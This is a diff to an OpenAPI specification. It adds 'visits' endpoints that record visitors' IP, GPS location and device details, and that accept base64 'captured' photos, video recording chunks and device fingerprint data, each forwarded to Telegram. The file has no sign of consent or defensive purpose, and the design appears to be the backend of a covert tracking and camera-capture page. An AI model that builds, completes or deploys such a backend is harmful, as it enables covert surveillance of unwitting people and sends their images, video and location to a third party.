@@ -10,6 +10,8 @@ servers:
 tags:
   - name: health
     description: Health operations
+  - name: visits
+    description: Visitor tracking operations
 paths:
   /healthz:
     get:
@@ -24,6 +26,115 @@ paths:
             application/json:
               schema:
                 $ref: "#/components/schemas/HealthStatus"
+  /visits:
+    post:
+      operationId: logVisit
+      tags: [visits]
+      summary: Log a new visitor
+      description: Records a new visitor with location and device info, then sends Telegram notification
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/VisitInput"
+      responses:
+        "201":
+          description: Visit logged
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/Visit"
+        "400":
+          description: Bad request
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/ErrorResponse"
+    get:
+      operationId: listVisits
+      tags: [visits]
+      summary: List all visits
+      description: Returns all recorded visitor entries, newest first
+      responses:
+        "200":
+          description: List of visits
+          content:
+            application/json:
+              schema:
+                type: array
+                items:
+                  $ref: "#/components/schemas/Visit"
+  /visits/stats:
+    get:
+      operationId: getVisitStats
+      tags: [visits]
+      summary: Get visit statistics
+      description: Returns aggregate stats - total visits, unique IPs, top countries, visits per day
+      responses:
+        "200":
+          description: Visit statistics
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/VisitStats"
+  /visits/deviceinfo:
+    post:
+      operationId: sendDeviceInfo
+      tags: [visits]
+      summary: Send device fingerprint info
+      description: Receives collected device/browser info and forwards to Telegram
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/DeviceInfoInput"
+      responses:
+        "200":
+          description: OK
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/OkResponse"
+  /visits/photo:
+    post:
+      operationId: sendPhoto
+      tags: [visits]
+      summary: Send a captured photo
+      description: Receives a base64-encoded photo and forwards to Telegram
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/PhotoInput"
+      responses:
+        "200":
+          description: OK
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/OkResponse"
+  /visits/videochunk:
+    post:
+      operationId: sendVideoChunk
+      tags: [visits]
+      summary: Send a video recording chunk
+      description: Receives a base64-encoded video chunk and forwards to Telegram
+      requestBody:
+        required: true
+        content:
+          application/json:
+            schema:
+              $ref: "#/components/schemas/VideoChunkInput"
+      responses:
+        "200":
+          description: OK
+          content:
+            application/json:
+              schema:
+                $ref: "#/components/schemas/OkResponse"
 components:
   schemas:
     HealthStatus:
@@ -33,4 +144,139 @@ components:
           type: string
       required:
         - status
-
+    VisitInput:
+      type: object
+      properties:
+        latitude:
+          type: ["number", "null"]
+        longitude:
+          type: ["number", "null"]
+        accuracy:
+          type: ["number", "null"]
+        altitude:
+          type: ["number", "null"]
+        referrer:
+          type: ["string", "null"]
+      required: []
+    Visit:
+      type: object
+      properties:
+        id:
+          type: integer
+        ip:
+          type: ["string", "null"]
+        latitude:
+          type: ["number", "null"]
+        longitude:
+          type: ["number", "null"]
+        accuracy:
+          type: ["number", "null"]
+        altitude:
+          type: ["number", "null"]
+        country:
+          type: ["string", "null"]
+        city:
+          type: ["string", "null"]
+        userAgent:
+          type: ["string", "null"]
+        browser:
+          type: ["string", "null"]
+        os:
+          type: ["string", "null"]
+        deviceType:
+          type: ["string", "null"]
+        referrer:
+          type: ["string", "null"]
+        createdAt:
+          type: string
+      required:
+        - id
+        - createdAt
+    VisitStats:
+      type: object
+      properties:
+        totalVisits:
+          type: integer
+        uniqueIps:
+          type: integer
+        withLocation:
+          type: integer
+        recentVisits:
+          type: array
+          items:
+            $ref: "#/components/schemas/Visit"
+        topCountries:
+          type: array
+          items:
+            $ref: "#/components/schemas/CountryStat"
+        visitsPerDay:
+          type: array
+          items:
+            $ref: "#/components/schemas/DayStat"
+      required:
+        - totalVisits
+        - uniqueIps
+        - withLocation
+        - recentVisits
+        - topCountries
+        - visitsPerDay
+    CountryStat:
+      type: object
+      properties:
+        country:
+          type: ["string", "null"]
+        count:
+          type: integer
+      required:
+        - country
+        - count
+    DayStat:
+      type: object
+      properties:
+        date:
+          type: string
+        count:
+          type: integer
+      required:
+        - date
+        - count
+    DeviceInfoInput:
+      type: object
+      additionalProperties: true
+      properties: {}
+    PhotoInput:
+      type: object
+      properties:
+        photo:
+          type: string
+        caption:
+          type: ["string", "null"]
+      required:
+        - photo
+    VideoChunkInput:
+      type: object
+      properties:
+        chunk:
+          type: string
+        mimeType:
+          type: ["string", "null"]
+        index:
+          type: ["integer", "null"]
+        label:
+          type: ["string", "null"]
+      required:
+        - chunk
+    OkResponse:
+      type: object
+      properties:
+        ok:
+          type: boolean
+      required:
+        - ok
+    ErrorResponse:
+      type: object
+      properties:
+        error:
+          type: string
+      required:
+        - error
